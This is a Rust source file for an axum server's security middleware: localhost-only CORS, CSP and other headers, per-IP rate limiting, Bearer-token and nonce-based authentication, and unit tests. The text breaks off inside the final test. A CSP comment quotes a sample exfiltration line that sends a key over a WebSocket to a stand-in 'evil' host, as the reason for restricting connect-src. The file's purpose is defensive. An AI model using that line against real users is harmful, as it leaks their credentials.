use std::net::IpAddr;
use std::sync::Arc;
use std::time::Instant;

use axum::extract::{ConnectInfo, Request, State};
use axum::http::{HeaderValue, Method, StatusCode};
use axum::middleware::Next;
use axum::response::{IntoResponse, Response};
use axum::Json;
use dashmap::DashMap;
use tower_http::cors::CorsLayer;

use crate::api::server::AppState;

/// Constant-time byte comparison to prevent timing side-channel attacks on API key validation.
/// Iterates over max(len) bytes to avoid leaking the expected token length via timing.
fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
    let mut diff = (a.len() != b.len()) as u8;
    let max_len = a.len().max(b.len());
    for i in 0..max_len {
        let ab = a.get(i).copied().unwrap_or(0);
        let bb = b.get(i).copied().unwrap_or(0);
        diff |= ab ^ bb;
    }
    diff == 0
}

/// Create a CORS layer restricted to localhost origins on the configured port.
///
/// Dynamically builds the origin whitelist from the actual listen port so users
/// running on non-default ports (e.g. `-p 9000`) don't get blocked by CORS.
pub fn cors_layer(port: u16) -> CorsLayer {
    let mut origins: Vec<HeaderValue> = Vec::with_capacity(3);
    if let Ok(v) = format!("http://localhost:{port}").parse::<HeaderValue>() {
        origins.push(v);
    }
    if let Ok(v) = format!("http://127.0.0.1:{port}").parse::<HeaderValue>() {
        origins.push(v);
    }
    // IPv6 loopback — browsers on IPv6-only stacks resolve `localhost` to
    // `[::1]` and send `Origin: http://[::1]:port`, which the v4 entries miss.
    if let Ok(v) = format!("http://[::1]:{port}").parse::<HeaderValue>() {
        origins.push(v);
    }
    CorsLayer::new()
        .allow_origin(origins)
        .allow_methods([
            Method::GET,
            Method::POST,
            Method::PUT,
            Method::DELETE,
            Method::OPTIONS,
        ])
        .allow_headers([
            axum::http::header::CONTENT_TYPE,
            axum::http::header::AUTHORIZATION,
            axum::http::header::ACCEPT,
            axum::http::HeaderName::from_static("x-api-key"),
            axum::http::HeaderName::from_static("anthropic-version"),
            // R108: SDKs send `anthropic-beta` to opt into preview features
            // (extended thinking, token-efficient tools, etc.). The header
            // is captured at `anthropic/mod.rs::proxy_beta` and forwarded
            // upstream — without listing it here, browser preflight strips
            // it on cross-origin requests, silently degrading to vanilla
            // Claude behavior.
            axum::http::HeaderName::from_static("anthropic-beta"),
        ])
}

/// Security headers middleware — adds defensive headers to all responses.
pub async fn security_headers(req: Request, next: Next) -> Response {
    let mut response = next.run(req).await;
    let headers = response.headers_mut();
    headers.insert(
        axum::http::header::X_CONTENT_TYPE_OPTIONS,
        HeaderValue::from_static("nosniff"),
    );
    headers.insert(
        axum::http::header::X_FRAME_OPTIONS,
        HeaderValue::from_static("DENY"),
    );
    headers.insert(
        axum::http::header::REFERRER_POLICY,
        HeaderValue::from_static("no-referrer"),
    );
    // SEC: `connect-src 'self'` covers both same-origin XHR/fetch AND same-
    // origin WebSocket upgrades (CSP Level 3). The previous `ws: wss:` allowed
    // any host — making post-XSS exfiltration (e.g. `new WebSocket('ws://evil/'+key)`)
    // possible despite `script-src 'self'` blocking inline scripts. Same-origin
    // is the only place the dashboard ever needs to talk.
    headers.insert(
        axum::http::header::CONTENT_SECURITY_POLICY,
        HeaderValue::from_static(
            "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self'; img-src 'self' data: blob:; font-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'",
        ),
    );
    response
}

/// Bucket category for rate limiting — each category has its own token bucket per IP.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash)]
enum BucketKind {
    Api,
    Admin,
    /// Stricter rate limit for sensitive key-management endpoints.
    SensitiveAdmin,
    /// Provider health polling. Makes external calls like the probes, so it is
    /// still capped — but in its own bucket, sized to the cadence the dashboard
    /// actually polls at (30s by default, i.e. 2/min). Sharing the probe bucket
    /// meant the dashboard's own default polling plus ordinary interaction
    /// exceeded the limit and the page 429'd itself.
    ProviderHealth,
    /// WebSocket ticket issuance. Bounded for its own reason — every ticket
    /// writes an entry to `state.events.ws_tickets` — which is unrelated to the
    /// external-API cost that sets `SENSITIVE_ADMIN_RPM`. Sharing one bucket
    /// meant a normal dashboard load, which issues a ticket and probes provider
    /// status at the same time, exhausted the budget between them and had its
    /// WebSocket refused; live updates then stop for the whole page.
    WsTicket,
}

/// Requests per minute for sensitive key-management endpoints.
const SENSITIVE_ADMIN_RPM: u64 = 5;
/// Requests per minute for provider health polling. Covers the dashboard's
/// 30s default cadence with headroom for a user who shortens it, while still
/// bounding how fast we can be made to call out to cloud providers.
const PROVIDER_HEALTH_RPM: u64 = 6;
/// Requests per minute for WebSocket ticket issuance. Generous enough for a
/// dashboard that reconnects a few times (each reconnect needs a fresh ticket),
/// tight enough that a token holder cannot flood the ticket map.
const WS_TICKET_RPM: u64 = 30;
/// Maximum rate-limiter buckets to prevent memory exhaustion from IP spoofing.
const MAX_RATE_BUCKETS: usize = 50_000;

/// Token-bucket rate limiter keyed by client IP address.
///
/// Each IP gets separate buckets for API and admin endpoints that refill
/// at their respective `rpm` rates per minute.
#[derive(Clone)]
pub struct RateLimiter {
    /// Map from (IP, bucket_kind) → (tokens_remaining, last_refill_time)
    buckets: Arc<DashMap<(IpAddr, BucketKind), (u64, Instant)>>,
    /// Requests per minute for normal endpoints (`/v1/`, `/api/chat`)
    pub rpm: u64,
    /// Requests per minute for admin endpoints (`/api/admin/`)
    pub admin_rpm: u64,
}

impl RateLimiter {
    /// Create a new rate limiter with the given limits.
    pub fn new(rpm: u64, admin_rpm: u64) -> Self {
        Self {
            buckets: Arc::new(DashMap::new()),
            rpm,
            admin_rpm,
        }
    }

    /// Remove entries that have been idle longer than the given window.
    /// Call this periodically (e.g. every few minutes) to prevent unbounded growth
    /// from unique client IPs accumulating over time.
    pub fn cleanup(&self, max_idle: std::time::Duration) {
        let now = Instant::now();
        self.buckets
            .retain(|_key, (_, last_refill)| now.duration_since(*last_refill) < max_idle);
    }

    /// Try to consume one token for the given IP, path, and HTTP method.
    /// Returns `true` if allowed, `false` if rate-limited.
    fn try_acquire(&self, ip: IpAddr, path: &str, is_mutating: bool) -> bool {
        // Sensitive endpoints: external-API probes always restricted; key/provider
        // mutations restricted but reads use the normal admin bucket (page loads
        // call these on every refresh and hitting 5/min breaks the dashboard).
        let (kind, limit) = if path == "/api/admin/provider-health" {
            (BucketKind::ProviderHealth, PROVIDER_HEALTH_RPM)
        } else if path == "/api/admin/provider-model-status"
            || ((path == "/api/admin/providers" || path == "/api/admin/api-key") && is_mutating)
            // Auto-update endpoints: download + SHA256 verify + atomic
            // rename. Strict cap so a runaway caller can't trigger
            // repeated update downloads (each is a heavy GitHub fetch).
            || path == "/api/admin/update/check"
            || path == "/api/admin/update/apply"
        {
            (BucketKind::SensitiveAdmin, SENSITIVE_ADMIN_RPM)
        } else if path == "/api/admin/ws-ticket" {
            // SEC: each issuance writes a fresh entry to
            // `state.events.ws_tickets`, so this stays bounded — but in its own
            // bucket, not shared with the external-API probes.
            (BucketKind::WsTicket, WS_TICKET_RPM)
        } else if path.starts_with("/api/admin/") || path.starts_with("/api/claude-code/") {
            (BucketKind::Admin, self.admin_rpm)
        } else if path.starts_with("/v1/") || path.starts_with("/api/chat") || path == "/mcp" {
            (BucketKind::Api, self.rpm)
        } else {
            // Non-rate-limited paths (health, static, frontend)
            return true;
        };

        let now = Instant::now();
        let key = (ip, kind);

        // Cap total tracked buckets to prevent memory exhaustion from IP spoofing.
        // Check len() BEFORE entry() to avoid deadlock — DashMap::len() reads all
        // shards, but entry() holds a write lock on one shard. Calling len() while
        // holding an entry write lock deadlocks when len() tries to read the same shard.
        if !self.buckets.contains_key(&key) && self.buckets.len() >= MAX_RATE_BUCKETS {
            tracing::warn!(
                capacity = MAX_RATE_BUCKETS,
                "Rate limiter at capacity — denying new client"
            );
            return false;
        }

        let mut entry = match self.buckets.entry(key) {
            dashmap::mapref::entry::Entry::Occupied(e) => e.into_ref(),
            dashmap::mapref::entry::Entry::Vacant(v) => v.insert((limit, now)),
        };
        let (ref mut tokens, ref mut last_refill) = *entry;

        // Refill tokens based on elapsed time
        let elapsed = now.duration_since(*last_refill);
        let refill = (elapsed.as_secs_f64() / 60.0 * limit as f64) as u64;
        if refill > 0 {
            *tokens = (*tokens + refill).min(limit);
            *last_refill = now;
        }

        if *tokens > 0 {
            *tokens -= 1;
            true
        } else {
            false
        }
    }
}

/// Whether `path` is an admin GET that proxies to an external service
/// (HuggingFace, configured cloud providers). These paths stay
/// rate-limited even from loopback so a runaway local script — or a
/// malicious browser extension running on localhost:8800 — can't loop-
/// call them and burn HuggingFace / cloud-provider API quota or get our
/// IP banned.
///
/// Use prefix matching for `/api/admin/hf/source/*` — the model_id path
/// param means the canonical path varies per request and exact-match
/// would miss everything.
fn is_outbound_admin_path(path: &str) -> bool {
    path == "/api/admin/hf/probe"
        || path == "/api/admin/hf/search"
        || path == "/api/admin/provider-health"
        || path.starts_with("/api/admin/hf/source/")
}

/// Rate-limiting middleware.
///
/// Returns HTTP 429 Too Many Requests when a client exceeds their per-minute
/// request budget. Limits are configured via `rate_limit_rpm` (for `/v1/` and
/// `/api/chat` endpoints) and `rate_limit_admin_rpm` (for `/api/admin/`).
pub async fn rate_limit_middleware(
    ConnectInfo(addr): ConnectInfo<std::net::SocketAddr>,
    State(state): State<AppState>,
    req: Request,
    next: Next,
) -> Response {
    let path = req.uri().path().to_string();
    let is_mutating = !matches!(
        req.method(),
        &axum::http::Method::GET | &axum::http::Method::HEAD | &axum::http::Method::OPTIONS
    );
    let limiter = &state.rate_limiter;

    // Exempt localhost admin GET requests from rate limiting — the dashboard
    // polls these frequently and rate limiting causes a feedback loop
    // (429 → error banner → reconnect → more requests → more 429s).
    //
    // BUT carve out endpoints that proxy to external services (HF probe /
    // search) so a runaway local script — or a malicious browser extension
    // running on localhost:8800 — can't loop-call them and burn HuggingFace
    // API quota or get our IP banned.
    let is_loopback = addr.ip().is_loopback();
    let is_admin_get = path.starts_with("/api/admin/") && !is_mutating;
    if is_loopback && is_admin_get && !is_outbound_admin_path(&path) {
        return next.run(req).await;
    }

    if !limiter.try_acquire(addr.ip(), &path, is_mutating) {
        tracing::warn!(
            ip = %addr.ip(),
            path = %path,
            "Rate limit exceeded"
        );
        let body = serde_json::json!({
            "error": {
                "message": "Rate limit exceeded. Please slow down.",
                "type": "rate_limit_error",
                "param": null,
                "code": "rate_limit_error"
            }
        });
        return Response::builder()
            .status(StatusCode::TOO_MANY_REQUESTS)
            .header("content-type", "application/json")
            .header("retry-after", "60")
            .body(axum::body::Body::from(
                serde_json::to_string(&body).unwrap_or_default(),
            ))
            .unwrap_or_else(|_| (StatusCode::TOO_MANY_REQUESTS, Json(body)).into_response());
    }

    next.run(req).await
}

/// Whether the request looks like a same-origin browser fetch — used to
/// gate the loopback exemption on `GET /api/admin/api-key` so a
/// non-browser local process (curl, python) can't grab the API key.
///
/// Two acceptable signals:
///   * `Origin` matches this daemon's own origin (browsers send this on
///     CORS-relevant requests — POST, DELETE, cross-origin GET).
///   * `Sec-Fetch-Site: same-origin` (modern browsers auto-send this
///     for every same-origin request; curl/python don't send it).
///
/// Validate the per-page bootstrap nonce on a `GET /api/admin/api-key`
/// request. The dashboard handler in `api/server.rs::serve_dashboard_with_nonce`
/// substitutes a freshly-issued single-use nonce into the served HTML;
/// the dashboard JS (`frontend/js/components/settings.js::loadApiKey`)
/// reads it from `<meta name="bootstrap-nonce">` and sends it as the
/// `X-Dashboard-Nonce` header on its bootstrap fetch. The check is one-
/// time-use AND TTL-bounded (60s).
///
/// This replaces the prior `Sec-Fetch-Site: same-origin` fallback (a
/// curl-spoofable header). A loopback attacker who lacks ability to read
/// the served HTML now needs to either guess a 32-byte random value
/// (infeasible) or actively race the legitimate dashboard's bootstrap
/// fetch (a much narrower window that requires precisely-timed local
/// activity).
fn is_valid_bootstrap_nonce(state: &AppState, headers: &axum::http::HeaderMap) -> bool {
    let Some(nonce) = headers
        .get("x-dashboard-nonce")
        .and_then(|v| v.to_str().ok())
    else {
        return false;
    };
    // Length-bound the input before consulting the DashMap so a malicious
    // caller can't grind cycles by sending megabyte-long strings.
    if nonce.len() > 64 {
        return false;
    }
    state.consume_bootstrap_nonce(nonce)
}

/// Check whether a request is exempt from Bearer token authentication.
///
/// Frontend routes, health checks, and static assets are always exempt.
/// Dashboard data endpoints are only exempt from localhost (the local browser).
/// Remote clients must always authenticate with the Bearer token.
fn is_exempt_request(path: &str, method: &Method, is_loopback: bool) -> bool {
    // Frontend routes, health checks, static assets — always exempt (any origin)
    if matches!(
        path,
        "/" | "/health" | "/health/ready" | "/admin" | "/chat" | "/setup" | "/favicon.ico"
    ) || path.starts_with("/static/")
        || path.starts_with("/admin/")
        || path.starts_with("/chat/")
    {
        return true;
    }

    // /metrics is exempt but only from localhost to prevent remote recon.
    // R138 (closes R101/R102 deferrals): the `api.metrics_auth_required`
    // config flag can tighten this further by REMOVING the loopback
    // exemption — see `auth_middleware`, which short-circuits to the
    // non-exempt branch when the flag is set. We keep this helper itself
    // pure (no AppState) so the test matrix stays simple.
    if path == "/metrics" && is_loopback {
        return true;
    }

    // /api/admin/ws is Bearer-exempt because WebSocket upgrades can't carry
    // an Authorization header from a browser. The handler (api/websocket.rs)
    // instead validates a single-use short-lived ticket obtained via
    // `POST /api/admin/ws-ticket` — that endpoint IS Bearer-authed via this
    // same middleware. Without a valid ticket the handler returns 401
    // regardless of origin, so exposing the upgrade path here is safe.
    if path == "/api/admin/ws" && *method == Method::GET {
        return true;
    }

    // Historical note: read-only admin GET endpoints used to be exempt from
    // Bearer auth on loopback. The exemption was removed — any local process
    // (malicious browser extension, rogue service) could otherwise scrape
    // live peer / model / network data without credentials. The dashboard
    // already authenticates every call through `App.authFetch` in
    // frontend/js/core/data.js, so removing the exemption is transparent
    // to it. CLI / remote clients were already required to authenticate.
    let _ = (method, is_loopback); // silence unused-arg warnings in this arm
    false
}

/// Bearer token authentication middleware.
///
/// Checks the `Authorization: Bearer <token>` header against the stored API key.
/// Exempt paths (frontend routes, health, static assets, WebSocket upgrades) are
/// passed through without authentication.
pub async fn auth_middleware(
    ConnectInfo(addr): ConnectInfo<std::net::SocketAddr>,
    State(state): State<AppState>,
    req: Request,
    next: Next,
) -> Response {
    let path = req.uri().path().to_string();
    let method = req.method().clone();

    // R138 (closes R101/R102 deferrals about /metrics credit-balance
    // disclosure): when `api.metrics_auth_required` is set, /metrics
    // is NOT exempt even on loopback — Prometheus scrapers must send
    // a Bearer token. Default false preserves the existing convention
    // (and the dashboard's loopback scrape).
    if state.shared_state.config.api.metrics_auth_required && path == "/metrics" {
        // Skip the loopback-exempt branch — fall through to Bearer check.
    } else if is_exempt_request(&path, &method, addr.ip().is_loopback()) {
        // Exempt frontend routes, health, read-only dashboard endpoints (loopback-gated)
        return next.run(req).await;
    }

    // Exempt API key retrieval on first dashboard load. Loopback-only AND
    // the request must carry a valid one-time-use bootstrap nonce that the
    // dashboard handler embedded in the served HTML for this page load.
    // See `is_valid_bootstrap_nonce` — the prior `Sec-Fetch-Site` fallback
    // was curl-spoofable, so any local process could read the api-key by
    // setting that header.
    //
    // The dashboard JS reads the nonce out of `<meta name="bootstrap-nonce">`
    // and sends it as `X-Dashboard-Nonce`. A determined local attacker can
    // still scrape `/admin` to obtain a fresh nonce — this raises the bar
    // (curl now needs two coordinated requests against a 60s window) but
    // is not a hard boundary. The api_key file in data_dir is mode 0o600;
    // any same-UID process with shell access already has the key.
    if path == "/api/admin/api-key"
        && method == Method::GET
        && addr.ip().is_loopback()
        && is_valid_bootstrap_nonce(&state, req.headers())
    {
        return next.run(req).await;
    }
    // Otherwise fall through — the handler will fail auth normally with 401.

    // WebSocket upgrades at /api/admin/ws: no Bearer exemption.
    // Browsers can't set an Authorization header on WebSocket upgrades, so
    // the WS handler itself validates a short-lived single-use ticket from
    // `POST /api/admin/ws-ticket` (Bearer-authed) passed as `?t=<hex>`.
    // See api/websocket.rs::handler and api/websocket.rs::issue_ticket.

    // Exempt internal forwarded requests authenticated with per-process secret token.
    // Only on loopback — this is for local inter-process communication only.
    if addr.ip().is_loopback() {
        if let Some(token) = req
            .headers()
            .get("x-swarm-internal-token")
            .and_then(|v| v.to_str().ok())
        {
            if constant_time_eq(
                token.as_bytes(),
                state.shared_state.internal_auth_token.as_bytes(),
            ) {
                return next.run(req).await;
            }
        }
    }

    // Exempt peer-forwarded inference requests.
    // Only scoped to inference paths (/v1/chat/completions, /v1/messages) to prevent
    // known peers from bypassing auth on admin/management endpoints.
    if req.headers().get("x-swarm-forwarded").is_some() {
        let is_inference_path =
            path.starts_with("/v1/chat/completions") || path.starts_with("/v1/messages");

        if addr.ip().is_loopback() {
            // Loopback requires internal token (prevents localhost bypass)
            if let Some(token) = req
                .headers()
                .get("x-swarm-internal-token")
                .and_then(|v| v.to_str().ok())
            {
                if is_inference_path
                    && constant_time_eq(
                        token.as_bytes(),
                        state.shared_state.internal_auth_token.as_bytes(),
                    )
                {
                    return next.run(req).await;
                }
            }
            // Loopback without valid token: fall through to normal Bearer auth.
        }
        // Non-loopback peer-forwarded inference requests authenticate via the
        // shared cluster Bearer (forward_to_peer forwards Authorization:
        // Bearer verbatim — see gotcha #30). internal_auth_token is per-process
        // random and never crosses node boundaries, so the previous "known
        // peer IP + internal token" gate here was unreachable dead code.
        // Falling through to the normal Bearer check below is correct.
    }

    let expected_key = &state.shared_state.api_key;

    let extracted = super::extract_bearer_token(req.headers());
    let token: Option<&str> = if extracted.is_empty() {
        None
    } else {
        Some(extracted)
    };

    match token {
        Some(t) if constant_time_eq(t.as_bytes(), expected_key.as_bytes()) => next.run(req).await,
        _ => {
            tracing::debug!(
                request_path = %path,
                auth_present = token.is_some(),
                "DIAG: auth failure"
            );
            let body = serde_json::json!({
                "error": {
                    "message": "Invalid or missing API key. Provide a valid Bearer token in the Authorization header.",
                    "type": "authentication_error",
                    "param": null,
                    "code": "authentication_error"
                }
            });
            (StatusCode::UNAUTHORIZED, Json(body)).into_response()
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn outbound_admin_carve_out_catches_hf_probe_and_search() {
        // Loopback admin GET fast-path must NOT exempt these.
        assert!(is_outbound_admin_path("/api/admin/hf/probe"));
        assert!(is_outbound_admin_path("/api/admin/hf/search"));
        assert!(is_outbound_admin_path("/api/admin/provider-health"));
    }

    #[test]
    fn outbound_admin_carve_out_uses_prefix_for_hf_source() {
        // The canonical path varies per model_id (e.g.
        // /api/admin/hf/source/microsoft%2FPhi-3.5-mini). Prefix
        // matching catches every variant.
        assert!(is_outbound_admin_path("/api/admin/hf/source/abc"));
        assert!(is_outbound_admin_path(
            "/api/admin/hf/source/TinyLlama%2FTinyLlama-1.1B-Chat"
        ));
    }

    #[test]
    fn outbound_admin_carve_out_does_not_match_unrelated_admin() {
        // Read-only dashboard endpoints stay loopback-exempt.
        assert!(!is_outbound_admin_path("/api/admin/stats"));
        assert!(!is_outbound_admin_path("/api/admin/peers"));
        assert!(!is_outbound_admin_path("/api/admin/models"));
        assert!(!is_outbound_admin_path("/api/admin/network-map"));
        // Non-admin paths short-circuit elsewhere; sanity-check anyway.
        assert!(!is_outbound_admin_path("/v1/chat/completions"));
        assert!(!is_outbound_admin_path("/api/admin/hf"));
        assert!(!is_outbound_admin_path("/api/admin/hf/source"));
    }

    // The previous `same_origin_gate_*` tests covered the
    // `is_same_origin_browser_request` helper that gated the api-key
    // bootstrap on a curl-spoofable `Sec-Fetch-Site` header. The helper
    // and its tests were removed when the bootstrap was reworked to use
    // a per-page nonce (`api/server.rs::serve_dashboard_with_nonce` →
    // `AppState::consume_bootstrap_nonce`). Round-trip behavior of the
    // nonce is exercised in `api/server.rs::tests`.

    #[test]
    fn exempt_only_frontend_and_metrics() {
        let get = Method::GET;
        // Frontend routes, health, static — always exempt (any origin)
        assert!(is_exempt_request("/", &get, false));
        assert!(is_exempt_request("/health", &get, false));
        assert!(is_exempt_request("/health/ready", &get, false));
        assert!(is_exempt_request("/admin", &get, false));
        assert!(is_exempt_request("/chat", &get, false));
        assert!(is_exempt_request("/setup", &get, false));
        assert!(is_exempt_request("/static/css/style.css", &get, false));
        assert!(is_exempt_request("/static/js/app.js", &get, false));
        assert!(is_exempt_request("/favicon.ico", &get, false));
        // /metrics exempt only from loopback (standard Prometheus convention).
        assert!(is_exempt_request("/metrics", &get, true));
        assert!(!is_exempt_request("/metrics", &get, false));
        // Read-only admin GETs are NO LONGER loopback-exempt — any local
        // process doing a direct curl to these used to receive live peer /
        // model / network data without credentials. The dashboard
        // authenticates every call through App.authFetch (Bearer), so
        // removing the exemption is transparent to it.
        assert!(!is_exempt_request("/api/admin/stats", &get, true));
        assert!(!is_exempt_request("/api/admin/config", &get, true));
        assert!(!is_exempt_request("/api/admin/models", &get, true));
        assert!(!is_exempt_request("/api/admin/peers", &get, true));
        assert!(!is_exempt_request("/api/admin/shard-storage", &get, true));
        assert!(!is_exempt_request("/api/admin/hf/search", &get, true));
        assert!(!is_exempt_request("/api/admin/hf/probe", &get, true));
        assert!(!is_exempt_request("/api/admin/network-map", &get, true));
        assert!(!is_exempt_request("/api/admin/schedule", &get, true));
        assert!(!is_exempt_request("/api/admin/provider-models", &get, true));
        assert!(!is_exempt_request("/api/identity/nickname", &get, true));
        assert!(!is_exempt_request("/api/pool/state", &get, true));
        // Same endpoints NOT exempt from remote IPs (unchanged).
        assert!(!is_exempt_request("/api/admin/stats", &get, false));
        assert!(!is_exempt_request("/api/admin/peers", &get, false));
        assert!(!is_exempt_request("/api/admin/network-map", &get, false));
        assert!(!is_exempt_request("/api/admin/models", &get, false));
        // Sensitive endpoints still require auth everywhere (unchanged).
        assert!(!is_exempt_request("/api/admin/credits", &get, true));
        assert!(!is_exempt_request("/api/admin/network-code", &get, true));
        assert!(!is_exempt_request("/api/admin/providers", &get, true));
    }

    #[test]
    fn non_exempt_post_join_network() {
        // POST /api/admin/join-network requires auth (writes to peer cache)
        assert!(!is_exempt_request(
            "/api/admin/join-network",
            &Method::POST,
            true
        ));
    }

    #[test]
    fn non_exempt_mutations() {
        let put = Method::PUT;
        let post = Method::POST;
        let delete = Method::DELETE;
        // PUT /api/admin/config requires auth even from loopback
        assert!(!is_exempt_request("/api/admin/config", &put, true));
        // POST /api/pool/* require auth
        assert!(!is_exempt_request("/api/pool/create", &post, true));
        assert!(!is_exempt_request("/api/pool/invite", &post, true));
        assert!(!is_exempt_request("/api/pool/leave", &post, true));
        assert!(!is_exempt_request("/api/pool/remove", &post, true));
        assert!(!is_exempt_request("/api/pool/accept", &post, true));
        // PUT /api/identity/nickname requires auth
        assert!(!is_exempt_request("/api/identity/nickname", &put, true));
        assert!(!is_exempt_request("/api/identity/nickname", &delete, true));
        // API key not in general exempt list
        assert!(!is_exempt_request("/api/admin/api-key", &Method::GET, true));
        assert!(!is_exempt_request("/api/admin/shutdown", &post, true));
        assert!(!is_exempt_request("/api/admin/hf/download", &post, true));
        assert!(!is_exempt_request(
            "/api/admin/hf/download-shards",
            &post,
            true
        ));
        // OpenAI API always requires auth
        assert!(!is_exempt_request("/v1/models", &Method::GET, true));
        assert!(!is_exempt_request("/v1/chat/completions", &post, true));
        // PUT auto-manage and DELETE shard require auth
        assert!(!is_exempt_request(
            "/api/admin/models/test/auto-manage",
            &put,
            true
        ));
        assert!(!is_exempt_request(
            "/api/admin/models/test/shards/0",
            &delete,
            true
        ));
    }

    #[test]
    fn admin_read_only_endpoints_always_require_auth() {
        let get = Method::GET;
        // Parametric read-only admin GETs used to be loopback-exempt. The
        // exemption was removed — they now require Bearer auth from any IP.
        assert!(!is_exempt_request(
            "/api/admin/hf/source/test-model",
            &get,
            true
        ));
        assert!(!is_exempt_request(
            "/api/admin/hf/source/test-model",
            &get,
            false
        ));
        assert!(!is_exempt_request(
            "/api/admin/models/test-model/auto-manage",
            &get,
            true
        ));
        assert!(!is_exempt_request(
            "/api/admin/models/test-model/auto-manage",
            &get,
            false
        ));
    }

    #[test]
    fn rate_limiter_allows_within_budget() {
        let limiter = RateLimiter::new(5, 10);
        let ip: IpAddr = "192.168.1.1".parse().unwrap();
        // First 5 requests should be allowed
        for _ in 0..5 {
            assert!(limiter.try_acquire(ip, "/v1/chat/completions", false));
        }
        // 6th request should be denied
        assert!(!limiter.try_acquire(ip, "/v1/chat/completions", false));
    }

    #[test]
    fn rate_limiter_separate_admin_budget() {
        let limiter = RateLimiter::new(2, 5);
        let ip: IpAddr = "10.0.0.1".parse().unwrap();
        // Exhaust normal budget
        assert!(limiter.try_acquire(ip, "/v1/models", false));
        assert!(limiter.try_acquire(ip, "/v1/models", false));
        assert!(!limiter.try_acquire(ip, "/v1/models", false));
        // Admin budget is separate — still available
        for _ in 0..5 {
            assert!(limiter.try_acquire(ip, "/api/admin/stats", false));
        }
        assert!(!limiter.try_acquire(ip, "/api/admin/stats", false));
    }

    #[test]
    fn rate_limiter_skips_non_api_paths() {
        let limiter = RateLimiter::new(1, 1);
        let ip: IpAddr = "127.0.0.1".parse().unwrap();
        // Non-API paths are not rate-limited
        for _ in 0..100 {
            assert!(limiter.try_acquire(ip, "/health", false));
            assert!(limiter.try_acquire(ip, "/static/js/app.js", false));
            assert!(limiter.try_acquire(ip, "/admin", false));
        }
    }

    #[test]
    fn rate_limiter_per_ip_isolation() {
        let limiter = RateLimiter::new(2, 10);
        let ip1: IpAddr = "10.0.0.1".parse().unwrap();
        let ip2: IpAddr = "10.0.0.2".parse().unwrap();
        // Exhaust ip1 budget
        assert!(limiter.try_acquire(ip1, "/v1/chat/completions", false));
        assert!(limiter.try_acquire(ip1, "/v1/chat/completions", false));
        assert!(!limiter.try_acquire(ip1, "/v1/chat/completions", false));
        // ip2 still has full budget
        assert!(limiter.try_acquire(ip2, "/v1/chat/completions", false));
        assert!(limiter.try_acquire(ip2, "/v1/chat/completions", false));
        assert!(!limiter.try_acquire(ip2, "/v1/chat/completions", false));
    }

    // --- constant_time_eq tests ---

    #[test]
    fn constant_time_eq_identical() {
        assert!(constant_time_eq(b"secret-key-123", b"secret-key-123"));
    }

    #[test]
    fn constant_time_eq_different_content() {
        assert!(!constant_time_eq(b"secret-key-123", b"secret-key-456"));
    }

    #[test]
    fn constant_time_eq_different_lengths() {
        assert!(!constant_time_eq(b"short", b"longer-string"));
    }

    #[test]
    fn constant_time_eq_empty() {
        assert!(constant_time_eq(b"", b""));
    }

    #[test]
    fn constant_time_eq_one_empty() {
        assert!(!constant_time_eq(b"", b"notempty"));
        assert!(!constant_time_eq(b"notempty", b""));
    }

    #[test]
    fn constant_time_eq_single_bit_difference() {
        // Differ only in last bit of one byte
        assert!(!constant_time_eq(b"\x00", b"\x01"));
        assert!(!constant_time_eq(b"A", b"B")); // 0x41 vs 0x42
    }

    // --- Auth extraction logic tests ---

    #[test]
    fn bearer_token_extraction_from_header() {
        // Simulate the token extraction logic from auth_middleware
        let auth_header = Some("Bearer my-secret-key");
        let token = auth_header.and_then(|h| h.strip_prefix("Bearer "));
        assert_eq!(token, Some("my-secret-key"));
    }

    #[test]
    fn bearer_token_extraction_missing_prefix() {
        let auth_header = Some("Basic dXNlcjpwYXNz");
        let token = auth_header.and_then(|h| h.strip_prefix("Bearer "));
        assert_eq!(token, None);
    }

    #[test]
    fn bearer_token_extraction_no_header() {
        let auth_header: Option<&str> = None;
        let token = auth_header.and_then(|h| h.strip_prefix("Bearer "));
        assert_eq!(token, None);
    }

    #[test]
    fn x_api_key_fallback_logic() {
        // When Authorization header has no Bearer prefix, fall back to x-api-key
        let auth_header = Some("Basic dXNlcjpwYXNz"); // not Bearer
        let x_api_key = Some("my-api-key-from-header");

        let token = auth_header
            .and_then(|h| h.strip_prefix("Bearer "))
            .or(x_api_key);
        assert_eq!(token, Some("my-api-key-from-header"));
    }

    #[test]
    fn bearer_takes_precedence_over_x_api_key() {
        // When both Authorization: Bearer and x-api-key are present, Bearer wins
        let auth_header = Some("Bearer bearer-token");
        let x_api_key = Some("x-api-key-token");

        let token = auth_header
            .and_then(|h| h.strip_prefix("Bearer "))
            .or(x_api_key);
        assert_eq!(token, Some("bearer-token"));
    }

    #[test]
    fn auth_validation_with_constant_time_eq() {
        let expected_key = "sk-swarm-abc123";

        // Valid token
        let token = Some("sk-swarm-abc123");
        assert!(token.is_some_and(|t| constant_time_eq(t.as_bytes(), expected_key.as_bytes())));

        // Invalid token
        let token = Some("sk-swarm-wrong");
        assert!(!token.is_some_and(|t| constant_time_eq(t.as_bytes(), expected_key.as_bytes())));

        // Missing token
        let token: Option<&str> = None;
        assert!(!token.is_some_and(|t| constant_time_eq(t.as_bytes(), expected_key.as_bytes())));
    }

    #[test]
    fn sensitive_admin_rate_limit() {
        let limiter = RateLimiter::new(100, 100);
        let ip: IpAddr = "10.0.0.1".parse().unwrap();
        // Mutating (PUT/POST) sensitive endpoints get 5/min regardless of configured rpm
        for _ in 0..5 {
            assert!(limiter.try_acquire(ip, "/api/admin/providers", true));
        }
        assert!(!limiter.try_acquire(ip, "/api/admin/providers", true));

        // GETs on the same paths use normal admin budget (200/min) — page loads need this
        let ip2: IpAddr = "10.0.0.2".parse().unwrap();
        for _ in 0..50 {
            assert!(limiter.try_acquire(ip2, "/api/admin/api-key", false));
            assert!(limiter.try_acquire(ip2, "/api/admin/providers", false));
        }

        // provider-model-status is always SensitiveAdmin (makes external API calls)
        let ip3: IpAddr = "10.0.0.3".parse().unwrap();
        for _ in 0..5 {
            assert!(limiter.try_acquire(ip3, "/api/admin/provider-model-status", false));
        }
        assert!(!limiter.try_acquire(ip3, "/api/admin/provider-model-status", false));
    }

    #[test]
    fn rate_limiter_cleanup_removes_stale_entries() {
        let limiter = RateLimiter::new(10, 10);
        let ip: IpAddr = "10.0.0.1".parse().unwrap();
        // Create an entry
        limiter.try_acquire(ip, "/v1/chat/completions", false);
